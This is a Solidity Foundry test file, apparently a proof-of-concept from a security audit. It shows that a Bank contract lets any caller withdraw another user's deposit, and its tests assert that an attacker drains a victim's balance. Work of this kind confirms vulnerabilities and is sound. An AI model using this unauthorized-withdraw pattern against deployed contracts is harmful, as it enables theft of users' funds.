// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../Bank.sol";
import "./BankExploitHarness.sol";

contract BankUnauthorizedWithdrawPoC is Test {
    Bank public bank;
    BankExploitHarness public harness;
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        bank = new Bank();
        harness = new BankExploitHarness();
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);
        vm.prank(victim);
        bank.deposit{value: 5 ether}();
        vm.prank(victim);
        harness.deposit{value: 5 ether}();
    }

    function test_unauthorized_withdraw_drains_victim() public {
        uint256 victimBalBefore = bank.balances(victim);
        assertEq(victimBalBefore, 5 ether);

        vm.prank(attacker);
        bank.withdraw(victim, 5 ether);

        assertEq(bank.balances(victim), 0);
        assertEq(attacker.balance, 1 ether + 5 ether);
    }

    function test_exploit_harness_confirms_access_gap() public {
        vm.prank(attacker);
        bool ok = harness.runExploit(victim, 5 ether);
        assertTrue(ok, "attacker profit confirms missing access control");
    }
}
